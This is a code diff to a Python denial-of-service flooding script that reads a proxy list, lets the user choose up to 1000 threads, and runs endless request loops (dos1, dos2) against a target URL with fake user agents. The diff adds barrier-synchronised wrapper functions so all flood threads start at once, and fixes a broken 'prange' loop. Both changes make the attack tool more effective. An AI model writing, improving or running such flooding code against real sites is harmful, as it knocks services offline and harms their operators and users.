@@ -39,6 +39,15 @@ with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxysocks")
 
+# Запуск потоков
+def dospause1(barrier, url):
+    barrier.wait()
+    dos1(url)
+
+def dospause2(barrier, url):
+    barrier.wait()
+    dos2(url)
+
 def dos1(target):
     while True:
         #FakeUserAgent
@@ -124,16 +133,17 @@ except ValueError:
 if threads == 0 or threads > 1000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
+bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
 if proxyuseage == 1:
-    for i in prange(0, threads):
-        thr = threading.Thread(target=dos1, args=(url,))
+    for i in range(0, threads):
+        thr = threading.Thread(target=dospause1, args=(bar, url, ))
         thr.start()
 else:
-    for i in prange(0, threads):
-        thr2 = threading.Thread(target=dos2, args=(url,))
+    for i in range(0, threads):
+        thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
